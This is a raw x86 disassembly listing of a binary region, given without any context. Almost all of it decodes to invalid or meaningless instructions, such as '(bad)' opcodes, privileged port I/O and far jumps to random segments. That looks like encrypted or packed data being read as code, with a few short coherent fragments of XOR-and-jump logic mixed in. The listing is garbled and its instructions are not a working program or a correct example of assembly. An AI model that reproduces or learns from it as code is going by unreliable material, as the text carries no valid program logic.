  410652:	out    dx,eax
  410653:	fisttp WORD PTR [ecx-0x5e]
  410656:	mov    eax,0x484d857
  41065b:	scas   al,BYTE PTR es:[edi]
  41065c:	repnz data16 sti 
  41065f:	je     0x410671
  410661:	std    
  410662:	loopne 0x4105ef
  410664:	mov    al,0xfc
  410666:	xchg   edi,eax
  410667:	lock adc dl,BYTE PTR [esi+edx*1-0x1f43dad]
  41066f:	mov    ecx,?
  410671:	adc    ebx,DWORD PTR [ecx]
  410673:	mov    ds:0x999b9b38,al
  410678:	xchg   esi,eax
  410679:	jmp    0x410603
  41067b:	push   0x915d9a69
  410680:	leave  
  410681:	pusha  
  410682:	or     BYTE PTR [esi],cl
  410684:	cmp    al,0x4b
  410686:	jmp    0x4f121a80
  41068b:	(bad)  
  41068c:	iret   
  41068d:	ret    
  41068e:	pop    ecx
  41068f:	push   ecx
  410690:	icebp  
  410691:	adc    al,0xb9
  410693:	dec    eax
  410694:	arpl   WORD PTR [eax-0xc],di
  410697:	ds dec esp
  410699:	test   DWORD PTR [ebx-0x59e178fb],esp
  41069f:	adc    eax,0xf055cd69
  4106a4:	inc    esp
  4106a5:	dec    esi
  4106a6:	(bad)  
  4106a7:	sbb    dh,BYTE PTR [ebx*1-0x479a009c]
  4106ae:	aam    0x47
  4106b0:	ficomp WORD PTR [ecx]
  4106b2:	mov    eax,0x8955a77a
  4106b7:	aaa    
  4106b8:	pop    esi
  4106b9:	dec    ebp
  4106ba:	mov    al,ds:0x1f57d207
  4106bf:	test   ah,bl
  4106c1:	mov    bl,ch
  4106c3:	jge    0x4106da
  4106c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c6:	pop    ds
  4106c7:	fucom  st(4)
  4106c9:	or     al,al
  4106cb:	push   0xfffffff5
  4106cd:	imul   dl
  4106cf:	sti    
  4106d0:	inc    eax
  4106d1:	cdq    
  4106d2:	sbb    edi,esp
  4106d4:	popa   
  4106d5:	mov    edx,0xa9d627a2
  4106da:	xchg   dh,al
  4106dc:	mov    ch,0x7e
  4106de:	jae    0x41068e
  4106e0:	or     BYTE PTR [eax+0x78f82179],dh
  4106e6:	pop    ecx
  4106e7:	sbb    ah,cl
  4106e9:	lahf   
  4106ea:	fnsave [edx+edi*8+0x353902]
  4106f1:	pop    es
  4106f2:	add    ch,dh
  4106f4:	outs   dx,DWORD PTR ds:[esi]
  4106f5:	neg    BYTE PTR [edi]
  4106f7:	test   al,0x26
  4106f9:	adc    bl,dh
  4106fb:	fs ss mov edi,0x2ce9bf1f
  410702:	jle    0x4106dd
  410704:	ja     0x4106d6
  410706:	sub    ebx,DWORD PTR [ebx+0x2d25bf7]
  41070c:	dec    ebp
  41070d:	push   esp
  41070e:	scas   al,BYTE PTR es:[edi]
  41070f:	js     0x4106c0
  410711:	push   edx
  410712:	out    dx,eax
  410713:	(bad)  
  410714:	loopne 0x410699
  410716:	adc    al,0x11
  410718:	sub    al,0x31
  41071a:	push   0x6b
  41071c:	cmp    ebx,DWORD PTR [ebx-0x50]
  41071f:	push   ebp
  410720:	out    dx,al
  410721:	scas   al,BYTE PTR es:[edi]
  410722:	inc    ecx
  410723:	jne    0x4106b9
  410725:	push   bx
  410727:	inc    ecx
  410728:	out    dx,al
  410729:	imul   ecx,DWORD PTR [edi-0x7e75fb67],0xffffffa5
  410730:	pop    ecx
  410731:	ret    0x33d
  410734:	push   ss
  410735:	das    
  410736:	add    BYTE PTR [edx-0xe],ch
  410739:	in     al,dx
  41073a:	loopne 0x4106d6
  41073c:	jns    0x410765
  41073e:	inc    esi
  41073f:	ss mov dl,0xa9
  410742:	nop
  410743:	or     eax,0xcdaf72d0
  410748:	dec    edx
  410749:	call   0x8db0:0xdfdc414a
  410750:	outs   dx,BYTE PTR ds:[esi]
  410751:	cli    
  410752:	out    0x32,al
  410754:	popa   
  410755:	pop    es
  410756:	fidiv  DWORD PTR [eax+esi*4-0x28447882]
  41075d:	ins    DWORD PTR es:[edi],dx
  41075e:	addr16 xor al,0x2f
  410761:	rol    BYTE PTR [edi+0x38],1
  410764:	cmp    BYTE PTR [ebp-0x7e],cl
  410767:	push   edx
  410768:	mov    esp,0x3243a20b
  41076d:	jge    0x410747
  41076f:	pop    es
  410770:	cmc    
  410771:	imul   ecx,DWORD PTR [eax],0x45
  410774:	push   ds
  410775:	jge    0x41076b
  410777:	fmul   QWORD PTR [eax-0x58c8dbf5]
  41077d:	mov    cl,0xec
  41077f:	aaa    
  410780:	sub    bl,bl
  410782:	mov    cl,0x6c
  410784:	cmp    ebp,DWORD PTR [edi]
  410786:	and    DWORD PTR [esi+0x37],esp
  410789:	retf   0xeb55
  41078c:	fild   QWORD PTR [ecx+0x1e]
  41078f:	mov    esi,0xd639c05b
  410794:	cmp    BYTE PTR [esi],dl
  410796:	popa   
  410797:	gs xlat BYTE PTR gs:[ebx]
  41079a:	sub    ch,BYTE PTR [edx-0x1a34bcd5]
  4107a0:	mov    bl,0xa7
  4107a2:	mov    bl,0x5
  4107a4:	cmp    ch,BYTE PTR ds:0x8028d3f7
  4107aa:	xchg   edx,eax
  4107ab:	cmc    
  4107ac:	imul   esi,DWORD PTR [edi+0x57],0x66
  4107b0:	fs push ds
  4107b2:	fs cld 
  4107b4:	mov    dh,0xde
  4107b6:	or     al,0x87
  4107b8:	pop    edi
  4107b9:	or     al,BYTE PTR [edi]
  4107bb:	push   es
  4107bc:	cmp    al,0xa6
  4107be:	pop    esi
  4107bf:	jne    0x41080f
  4107c1:	pushf  
  4107c2:	jo     0x4107f7
  4107c4:	pop    edi
  4107c5:	adc    al,0xa
  4107c7:	cli    
  4107c8:	mov    bh,0x86
  4107ca:	jmp    0x94c4bde7
  4107cf:	add    cl,BYTE PTR [ebx+0x46bb76fd]
  4107d5:	leave  
  4107d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107d7:	stc    
  4107d8:	(bad)  
  4107d9:	sbb    eax,0x689faf84
  4107de:	scas   eax,DWORD PTR es:[edi]
  4107df:	bound  edx,QWORD PTR [edx]
  4107e1:	jmp    0x16102a59
  4107e6:	push   ecx
  4107e7:	les    ebx,FWORD PTR [esp+ebx*4+0x3b]
  4107eb:	retf   
  4107ec:	jp     0x4107fe
  4107ee:	add    eax,0xd80c7f16
  4107f3:	imul   eax,ebx,0x9c8bad26
  4107f9:	cwde   
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	bnd jb 0x41083a
  410812:	mov    esi,0x787851a6
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	sti    
  41081c:	push   cs
  41081d:	cmp    ebp,0x22a6f8b2
  410823:	mov    cl,BYTE PTR [ecx-0x47]
  410826:	popa   
  410827:	data16 cld 
  410829:	(bad)  
  41082a:	cmp    eax,0xdc2ae133
  41082f:	out    dx,al
  410830:	jnp    0x4107ee
  410832:	pop    eax
  410833:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410835:	jns    0x410821
  410837:	jns    0x4107e2
  410839:	xchg   ebp,eax
  41083a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41083b:	xchg   ebx,eax
  41083c:	cli    
  41083d:	add    dl,dh
  41083f:	mov    ch,0xf4
  410841:	in     eax,dx
  410842:	out    dx,al
  410843:	mov    edi,0x8fca8c1
  410848:	inc    eax
  410849:	dec    edi
  41084a:	int3   
  41084b:	or     ebp,esp
  41084d:	inc    ecx
  41084e:	dec    edi
  41084f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410851:	les    ebp,FWORD PTR [ecx]
  410853:	sub    BYTE PTR [eax],al
  410855:	jp     0x41088f
  410857:	jmp    0x27d284dd
  41085c:	adc    eax,0xd45ba65e
  410861:	frstor [ebp+0x40]
  410864:	lods   eax,DWORD PTR ds:[esi]
  410865:	icebp  
  410866:	ins    DWORD PTR es:[edi],dx
  410867:	cmp    eax,0x6f882254
  41086c:	pushf  
  41086d:	adc    DWORD PTR [esi+ecx*4-0x4d],ebx
  410871:	jl     0x4107fa
  410873:	test   DWORD PTR es:[eax+ebx*1],ebx
  410877:	push   esp
  410878:	rcl    BYTE PTR [ebx-0xdc63fea],cl
  41087e:	(bad)  
  41087f:	fstp   TBYTE PTR [eax]
  410881:	in     eax,dx
  410882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410884:	sub    BYTE PTR [eax-0x63],dl
  410887:	mov    BYTE PTR [ebx],dh
  410889:	sti    
  41088a:	jge    0x41080d
  41088c:	into   
  41088d:	sbb    BYTE PTR [ebp+0x69],0xd7
  410891:	xor    eax,0x8b091368
  410896:	inc    edx
  410897:	shr    DWORD PTR [esi],cl
  410899:	sti    
  41089a:	and    eax,0xe1bed4c3
  41089f:	or     DWORD PTR [edi+ebx*4],0xa1a24680
  4108a6:	add    eax,0x46b5cf46
  4108ab:	cmp    BYTE PTR [eax+ecx*1],0x67
  4108af:	add    DWORD PTR [eax-0x7b],edi
  4108b2:	xlat   BYTE PTR ds:[ebx]
  4108b3:	mov    eax,0x29c4e17d
  4108b8:	dec    ecx
  4108b9:	ins    DWORD PTR es:[edi],dx
  4108ba:	pop    eax
  4108bb:	ja     0x410908
  4108bd:	std    
  4108be:	xchg   esi,eax
  4108bf:	sbb    esp,DWORD PTR [edx-0x36]
  4108c2:	fs jnp 0x4108af
  4108c5:	xor    cl,BYTE PTR [ecx+ecx*4-0x22]
  4108c9:	jo     0x4108d7
  4108cb:	mov    ah,0x82
  4108cd:	test   DWORD PTR [edx+0x54],0x48eb7ec
  4108d4:	mov    BYTE PTR [ebx-0x64],dh
  4108d7:	push   ecx
  4108d8:	sbb    al,0xc
  4108da:	push   eax
  4108db:	into   
  4108dc:	xchg   esp,eax
  4108dd:	push   0xffffffe4
  4108df:	sbb    al,0xa5
  4108e1:	ror    ch,cl
  4108e3:	test   eax,0x72cf1ff9
  4108e8:	(bad)  
  4108e9:	jbe    0x43134284
  4108ef:	(bad)  
  4108f0:	xor    dh,BYTE PTR [edx+0x15]
  4108f3:	(bad)  [esi]
  4108f5:	popa   
  4108f6:	push   esp
  4108f7:	adc    ch,bl
  4108f9:	fldenv [eax+edx*1]
  4108fc:	push   ecx
  4108fd:	vandps xmm1,xmm1,XMMWORD PTR [edx+0x66]
  410902:	mov    bl,0xb
  410904:	sbb    BYTE PTR ds:[edx],bl
  410907:	dec    esi
  410908:	addr16 push ds
  41090a:	inc    eax
  41090b:	inc    ecx
  41090c:	pop    esi
  41090d:	push   ebp
  41090e:	push   esi
  41090f:	daa    
  410910:	shl    DWORD PTR [ebx],1
  410912:	mov    ecx,0xdcf89ddd
  410917:	pop    esp
  410918:	mov    bl,0x62
  41091a:	or     dl,al
  41091c:	jnp    0x410993
  41091e:	and    BYTE PTR [ecx],cl
  410920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410921:	add    esi,ebp
  410923:	stos   DWORD PTR es:[edi],eax
  410924:	call   0xd87f:0x3965d3d9
  41092b:	mov    eax,0x489e725e
  410930:	imul   ebp,DWORD PTR [esi],0x16
  410933:	sbb    edx,0x66
  410936:	(bad)  
  410937:	or     DWORD PTR [ebp-0x7f0a829c],esi
  41093d:	aaa    
  41093e:	data16 sub al,0xd4
  410941:	jle    0x41095c
  410943:	xlat   BYTE PTR ds:[ebx]
  410944:	sub    ebp,esp
  410946:	sub    al,0xc1
  410948:	test   al,0xe6
  41094a:	add    eax,0x1b29ee94
  41094f:	fcomi  st,st(1)
  410951:	shl    BYTE PTR [ecx+0x4b9b31c4],0xee
  410958:	ins    BYTE PTR es:[edi],dx
  410959:	jb     0x41097c
  41095b:	ret    
  41095c:	xor    eax,0x383231cd
  410961:	jmp    0x21ba9e96
  410966:	dec    eax
  410967:	inc    esp
  410968:	ds into 
  41096a:	sub    al,0x6c
  41096c:	mov    esi,0x3f9cb009
  410971:	daa    
  410972:	loope  0x410972
  410974:	inc    edi
  410975:	sbb    BYTE PTR [ebx],ch
  410977:	mov    ds:0x1e55eca1,al
  41097c:	clc    
  41097d:	mov    bh,0xec
  41097f:	jns    0x410978
  410981:	inc    edi
  410982:	jmp    DWORD PTR [esi+0x9]
  410985:	ret    
  410986:	jbe    0x410909
  410988:	push   ebx
  410989:	and    DWORD PTR [edx+0x39],ebx
  41098c:	mov    BYTE PTR [eax],ch
  41098e:	xor    DWORD PTR [eax],0xffffffd6
  410991:	pop    esi
  410992:	jecxz  0x41093f
  410994:	mov    dh,0xb5
  410996:	xchg   edi,eax
  410997:	cmp    al,0x91
  410999:	outs   dx,BYTE PTR ds:[esi]
  41099a:	sub    BYTE PTR [esi],ah
  41099c:	(bad)  
  41099d:	jmp    0x3672:0x60365303
  4109a4:	in     al,dx
  4109a5:	and    ebx,DWORD PTR [edx-0x23a2f575]
  4109ab:	xchg   ebx,eax
  4109ac:	frstor [ebx]
  4109ae:	popa   
  4109af:	sub    ax,0x267f
  4109b3:	outs   dx,BYTE PTR ds:[esi]
  4109b4:	mov    al,ds:0x2d034322
  4109b9:	jmp    0x911babd1
  4109be:	mov    ecx,esp
  4109c0:	aam    0x5e
  4109c2:	mov    ch,0xf0
  4109c4:	lock pop esi
  4109c6:	sub    al,0xc1
  4109c8:	fs ds scas eax,DWORD PTR es:[edi]
  4109cb:	mov    gs,WORD PTR [eax-0x78]
  4109ce:	sbb    eax,0xdb193b1e
  4109d3:	(bad)  
  4109d4:	loope  0x410a4d
  4109d6:	dec    ebx
  4109d7:	dec    ebp
  4109d8:	jns    0x41099f
  4109da:	stc    
  4109db:	sbb    eax,0x57667
  4109e0:	push   esi
  4109e1:	mov    bh,0xb1
  4109e3:	(bad)  
  4109e7:	repz test DWORD PTR [eax-0x3322595d],esi
  4109ee:	aad    0xfa
  4109f0:	mov    bh,0xff
  4109f2:	inc    eax
  4109f3:	xchg   ebp,eax
  4109f4:	pop    ecx
  4109f5:	dec    ecx
  4109f6:	ss das 
  4109f8:	icebp  
  4109f9:	jae    0x4109f7
  4109fb:	(bad)  
  4109fd:	(bad)  
  4109fe:	pop    ss
  4109ff:	shl    dh,cl
  410a01:	popa   
  410a02:	xchg   bl,cl
  410a04:	popf   
  410a05:	mov    ds,edx
  410a07:	xor    dh,BYTE PTR [ebx+0x4df262ab]
  410a0d:	out    0xde,eax
  410a0f:	mov    eax,0x92ec5126
  410a14:	daa    
  410a15:	lds    edx,FWORD PTR [ebp+0x6f]
  410a18:	cld    
  410a19:	(bad)  
  410a1a:	sar    DWORD PTR [ebp+ebp*2+0x70bdc20c],cl
  410a21:	mov    bh,0xa6
  410a23:	and    ebp,DWORD PTR [eax+0x2c0950b8]
  410a29:	cs pop es
  410a2b:	mov    esp,0x9495bc5a
  410a30:	or     al,0xb4
  410a32:	xchg   edi,eax
  410a33:	pop    eax
  410a34:	in     eax,0x81
  410a36:	cli    
  410a37:	shl    BYTE PTR [ecx],1
  410a39:	int3   
  410a3a:	pushf  
  410a3b:	mov    DWORD PTR [ecx-0x5705e0b4],ebp
  410a41:	mov    ch,0x42
  410a43:	rol    BYTE PTR [ebx+ebx*1],0x3d
  410a47:	shr    BYTE PTR [edi-0x2fb5e30e],cl
  410a4d:	bound  edi,QWORD PTR [edi-0xbca9168]
  410a53:	xlat   BYTE PTR ds:[ebx]
  410a54:	mov    al,ds:0x835482d4
  410a59:	loope  0x410a1b
  410a5b:	in     al,dx
  410a5c:	mov    ebx,0xea83907c
  410a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a62:	lods   eax,DWORD PTR ds:[esi]
  410a63:	loope  0x410a95
  410a65:	jp     0x410ae3
  410a67:	xor    al,0x28
  410a69:	jae    0x410a4f
  410a6b:	mov    bl,0xbf
  410a6d:	xor    edi,DWORD PTR [edx-0x52856617]
  410a73:	jmp    0x410aaa
  410a75:	fwait
  410a76:	xor    BYTE PTR [bp+di+0x54],dh
  410a7a:	stos   BYTE PTR es:[edi],al
  410a7b:	sub    al,ah
  410a7d:	sub    ch,BYTE PTR [edi-0x45094c3]
  410a83:	mov    esp,0x870fc4c2
  410a88:	or     BYTE PTR [eax],al
  410a8a:	add    BYTE PTR [eax],al
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	neg    DWORD PTR [ecx+0x132f62e0]
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	jp     0x410b34
  410abd:	fild   WORD PTR [edi+0x69a6f43a]
  410ac3:	cbw    
  410ac5:	iret   
  410ac6:	stc    
  410ac7:	or     al,0xeb
  410ac9:	outs   dx,DWORD PTR ds:[esi]
  410aca:	rol    ebp,0x9a
  410acd:	mov    ebx,0x81b63336
  410ad2:	popf   
  410ad3:	sbb    ah,BYTE PTR [edx+0x149afece]
  410ad9:	popa   
  410ada:	cdq    
  410adb:	mov    ds:0xec89c8a2,al
  410ae0:	je     0x410ade
  410ae2:	call   FWORD PTR [edi-0x3a]
  410ae5:	mov    eax,0x94651a0b
  410aea:	cld    
  410aeb:	xor    eax,0xbc31e383
  410af0:	or     DWORD PTR fs:[ebx+0x79],edx
  410af4:	xchg   dx,ax
  410af6:	ja     0x410b00
  410af8:	scas   eax,DWORD PTR es:[edi]
  410af9:	and    DWORD PTR [ebx+0x4f8a149f],edi
  410aff:	out    0x88,al
  410b01:	(bad)  
  410b02:	push   ecx
  410b03:	jne    0x410b30
  410b05:	test   al,0xc7
  410b07:	mov    ah,0x64
  410b09:	and    cl,al
  410b0b:	in     eax,dx
  410b0c:	ds mov cl,0x47
  410b0f:	(bad)  
  410b11:	les    edi,FWORD PTR [edx+0x71]
  410b14:	addr16 enter 0x89c6,0x75
  410b19:	fsubr  st,st(0)
  410b1b:	out    0x8b,al
  410b1d:	jbe    0x410af7
  410b1f:	and    ecx,DWORD PTR [ebp-0x56]
  410b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b23:	aas    
  410b24:	int    0xb9
  410b26:	push   edx
  410b27:	xor    BYTE PTR ds:0xb76a65dc,cl
  410b2d:	retf   0x9245
  410b30:	stc    
  410b31:	cld    
  410b32:	xchg   ecx,eax
  410b33:	and    bl,ah
  410b35:	or     BYTE PTR [eax-0x4ded86c6],0x0
  410b3c:	sbb    cl,ah
  410b3e:	int    0x94
  410b40:	stos   DWORD PTR es:[edi],eax
  410b41:	out    0xd8,al
  410b43:	lods   al,BYTE PTR ds:[esi]
  410b44:	sub    bh,bl
  410b46:	push   ds
  410b47:	dec    esi
  410b48:	sbb    al,0xce
  410b4a:	and    al,0x72
  410b4c:	or     BYTE PTR ds:[esi+0x7ffee412],cl
  410b53:	lahf   
  410b54:	pop    ss
  410b55:	xchg   ebp,eax
  410b56:	add    esi,ebp
  410b58:	(bad)  
  410b59:	cli    
  410b5a:	popf   
  410b5b:	cs in  eax,0x4f
  410b5e:	fild   DWORD PTR [edi+0x29dfd5cf]
  410b64:	shl    esp,cl
  410b66:	retf   0x7df
  410b69:	jmp    0x96868026
  410b6e:	ins    DWORD PTR es:[edi],dx
  410b6f:	adc    bl,BYTE PTR [ebp-0x6c]
  410b72:	jmp    0xf2e701e0
  410b77:	and    BYTE PTR [eax],bl
  410b79:	adc    ch,BYTE PTR [eax-0x2180624e]
  410b7f:	rcl    BYTE PTR [esi],0x88
  410b82:	fcmovu st,st(6)
  410b84:	xlat   BYTE PTR ds:[ebx]
  410b85:	push   eax
  410b86:	ret    
  410b87:	jb     0x410bc4
  410b89:	pushf  
  410b8a:	or     cl,BYTE PTR [ebp+edi*1-0x18]
  410b8e:	jle    0x410bf6
  410b90:	imul   esi,DWORD PTR [edi],0xc4bd1738
  410b96:	sbb    dl,BYTE PTR [edi+edi*4]
  410b99:	enter  0xc100,0xd1
  410b9d:	fmulp  st(4),st
  410b9f:	pop    edi
  410ba0:	mov    ah,0xaf
  410ba2:	inc    edx
  410ba3:	push   ds
  410ba4:	(bad)  
  410ba5:	popf   
  410ba6:	inc    esi
  410ba7:	xchg   edi,eax
  410ba8:	mov    esi,0xd1c58edb
  410bad:	lds    ebp,FWORD PTR [esi]
  410baf:	jno    0x410b3c
  410bb1:	pop    edi
  410bb2:	jge    0x410b9b
  410bb4:	imul   ecx,esi,0xffffff98
  410bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb8:	rcr    BYTE PTR [ecx+0x4cecb83],cl
  410bbe:	xor    al,BYTE PTR [eax+edx*2]
  410bc1:	test   dl,dl
  410bc3:	js     0x410b60
  410bc5:	xor    ebp,DWORD PTR [edx+edi*8]
  410bc8:	jo     0x410c3e
  410bca:	popf   
  410bcb:	dec    ebp
  410bcc:	push   ebp
  410bcd:	ins    BYTE PTR es:[edi],dx
  410bce:	pop    ds
  410bcf:	mov    bh,0x59
  410bd1:	mov    edx,0x2365b61d
  410bd6:	xor    al,0x42
  410bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd9:	cmp    al,BYTE PTR [edx+esi*4+0x5a6123c0]
  410be0:	test   BYTE PTR [ebx+0x3d315fa5],dl
  410be6:	int    0x2f
  410be8:	or     ebp,edi
  410bea:	jmp    0xd3ff:0x145b885
  410bf1:	jp     0x410b80
  410bf3:	pop    ebx
  410bf4:	adc    BYTE PTR gs:[ebp-0x37fd9a56],cl
  410bfb:	sbb    eax,DWORD PTR [ebx+ebp*2]
  410bfe:	mov    ds:0x61bc43d7,al
  410c03:	int    0xc8
  410c05:	int    0xdb
  410c07:	sub    DWORD PTR [ebx-0x5b],edi
  410c0a:	or     al,0x19
  410c0c:	jg     0x410c14
  410c0e:	es in  eax,0x75
  410c11:	and    DWORD PTR [edx-0x6a44f590],edi
  410c17:	push   ebp
  410c18:	xor    dl,BYTE PTR [edx+0x54a8b76e]
  410c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c1f:	fist   WORD PTR [esi]
  410c21:	inc    esi
  410c22:	or     eax,0x37a59b40
  410c27:	pushf  
  410c28:	mov    edi,0x89acc207
  410c2d:	icebp  
  410c2e:	jno    0x410c87
  410c30:	sbb    eax,0xe46e529c
  410c35:	add    eax,0x1f7a2c00
  410c3a:	mov    dl,0xba
  410c3c:	add    ch,BYTE PTR [eax]
  410c3e:	dec    esi
  410c3f:	daa    
  410c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c41:	lods   eax,DWORD PTR ds:[esi]
  410c42:	push   0xd2708b7c
  410c47:	retf   
  410c48:	mov    dh,al
  410c4a:	imul   eax,DWORD PTR [ebx+0x7d],0xf90e6852
  410c51:	xchg   ebp,eax
  410c52:	repz jns 0x410c67
  410c55:	out    0x6b,eax
  410c57:	inc    edx
  410c58:	das    
  410c59:	inc    ebp
  410c5a:	cld    
  410c5b:	dec    ebp
  410c5c:	repnz aas 
  410c5e:	in     al,0x2d
  410c60:	mov    al,ds:0x6e246042
  410c65:	ror    BYTE PTR [edx],0x30
  410c68:	lods   al,BYTE PTR ds:[esi]
  410c69:	iret   
  410c6a:	je     0x410ce8
  410c6c:	ret    0x5967
  410c6f:	and    DWORD PTR [edi+0x27bfff04],eax
  410c75:	scas   eax,DWORD PTR es:[edi]
  410c76:	ficom  WORD PTR [ebx]
  410c78:	jl     0x410c69
  410c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c7b:	mov    al,ds:0xf00b727d
  410c80:	add    esi,DWORD PTR [edi]
  410c82:	jmp    0x410cec
  410c84:	fcomi  st,st(2)
  410c86:	xchg   edi,eax
  410c87:	imul   BYTE PTR [esi+eiz*4+0x529a8a2]
  410c8e:	add    al,ah
  410c90:	jbe    0x410c9a
  410c92:	dec    esi
  410c93:	sbb    al,0xee
  410c95:	mov    ebp,0xfa31d1ff
  410c9a:	xchg   ecx,eax
  410c9b:	push   es
  410c9c:	sub    eax,0xa2017956
  410ca1:	xor    ebx,edi
  410ca3:	jbe    0x410ca5
  410ca5:	(bad)
  410ca9:	sub    al,0x2b
  410cab:	push   0x9de5ad60
  410cb0:	mov    cl,0x6
  410cb2:	sbb    esi,0xffffffed
  410cb5:	test   DWORD PTR [edi+0x16fa24cb],esi
  410cbb:	bound  ecx,QWORD PTR ds:0xe79ca113
  410cc1:	(bad)  
  410cc2:	stc    
  410cc3:	mov    edi,edx
  410cc5:	outs   dx,DWORD PTR ds:[esi]
  410cc6:	pop    ebp
  410cc7:	shl    BYTE PTR [edx+0x73d91039],1
  410ccd:	jmp    0x1bf3:0x9a9294c1
  410cd4:	adc    dl,ah
  410cd6:	xor    eax,edi
  410cd8:	stos   DWORD PTR es:[edi],eax
  410cd9:	inc    ebx
  410cda:	rol    DWORD PTR [ebx-0x3ce8259f],0x37
  410ce1:	call   0x8836:0xc5262baf
  410ce8:	fsubp  st(1),st
  410cea:	cmp    DWORD PTR [ebx+0x6f],0xffffffe7
  410cee:	fsubp  st(2),st
  410cf0:	mov    al,0x5a
  410cf2:	das    
  410cf3:	xor    DWORD PTR [edi-0x5b601cf5],edx
  410cf9:	jmp    0x6031:0x6f68b230
  410d00:	cmc    
  410d01:	dec    ebx
  410d02:	hlt    
  410d03:	sbb    eax,0x1dd0370b
  410d08:	or     al,0x7d
  410d0a:	jge    0x410d2c
  410d0c:	cli    
  410d0d:	nop
  410d0e:	popf   
  410d0f:	mov    ch,0x56
  410d11:	xchg   edi,eax
  410d12:	repz jo 0x410ce6
  410d15:	ror    esi,cl
  410d17:	jge    0x410d97
  410d19:	push   ebx
  410d1a:	loop   0x410cdc
  410d1c:	out    dx,eax
  410d1d:	sub    eax,0x852b9165
  410d22:	rcl    DWORD PTR [edi+0x36],1
  410d25:	add    eax,DWORD PTR [ebx]
  410d27:	stc    
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	jbe    0x410de0
  410d62:	xor    eax,DWORD PTR [esi-0x8]
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	jl     0x410de0
  410d6e:	pop    ss
  410d6f:	js     0x410d12
  410d71:	push   0xffffffb2
  410d73:	push   esp
  410d74:	sbb    esi,DWORD PTR [ecx+eiz*8]
  410d77:	jo     0x410cfd
  410d79:	ficom  DWORD PTR [ecx+esi*4+0x1b]
  410d7d:	or     al,0x91
  410d7f:	mov    bl,0xa6
  410d81:	mov    al,ds:0xd87328d4
  410d86:	(bad)  
  410d87:	and    esi,DWORD PTR [edi]
  410d89:	add    al,0x2f
  410d8b:	fisubr WORD PTR [ecx+0x29]
  410d8e:	je     0x410dd3
  410d90:	mov    BYTE PTR [esi-0x23],bh
  410d93:	dec    esp
  410d94:	ret    
  410d95:	xor    eax,0x468dca40
  410d9a:	jle    0x410d62
  410d9c:	bound  ebp,QWORD PTR [edi-0x7fddbb53]
  410da2:	test   eax,0x327f1e34
  410da7:	pop    ebx
  410da8:	mov    esp,0x9a4aad5b
  410dad:	or     dl,dl
  410daf:	dec    esp
  410db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410db1:	outs   dx,BYTE PTR ds:[esi]
  410db2:	out    dx,al
  410db3:	xlat   BYTE PTR ds:[ebx]
  410db4:	pop    ecx
  410db5:	mov    al,ds:0x1572eec4
  410dba:	pop    DWORD PTR [edx+edi*4+0x4b84a636]
  410dc1:	aad    0x90
  410dc3:	pop    ebx
  410dc4:	mov    ds:0x348c4d58,eax
  410dc9:	in     eax,0x3b
  410dcb:	test   al,0x7c
  410dcd:	sub    bl,al
  410dcf:	outs   dx,BYTE PTR ds:[esi]
  410dd0:	mov    ch,0xbe
  410dd2:	test   al,0x63
  410dd4:	in     al,0xe
  410dd6:	ret    0x737d
  410dd9:	in     eax,dx
  410dda:	shr    DWORD PTR [eax-0x65],1
  410ddd:	mov    edx,0xa48587fc
  410de2:	nop
  410de3:	hlt    
  410de4:	sub    BYTE PTR [ebx],0xe4
  410de7:	fist   DWORD PTR [ecx+0x2d]
  410dea:	addr16 mov eax,ds:0x466e
  410dee:	push   0xffffffe9
  410df0:	and    bh,BYTE PTR [edx+0x40556dc4]
  410df6:	jo     0x410e3c
  410df8:	xchg   ebx,eax
  410df9:	out    dx,eax
  410dfa:	xchg   ebx,eax
  410dfb:	mov    esi,0xbfb342ea
  410e00:	outs   dx,DWORD PTR ds:[esi]
  410e01:	cdq    
